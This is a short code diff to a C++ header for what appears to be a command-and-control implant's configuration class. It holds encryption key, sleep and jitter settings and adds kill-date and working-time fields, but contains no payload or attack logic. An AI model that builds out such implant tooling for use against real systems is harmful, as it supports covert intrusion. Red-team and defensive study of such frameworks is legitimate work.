@@ -40,6 +40,8 @@ public:
 	BYTE* encrypt_key;
 	ULONG sleep_delay;
 	ULONG jitter_delay;
+	ULONG kill_date;
+	ULONG working_time;
 
 	BYTE  exit_method;
 	ULONG exit_task_id;
@@ -53,6 +55,7 @@ public:
 
 #elif defined(BEACON_TCP)
 	ProfileTCP profile;
+
 #endif
 
 	AgentConfig();
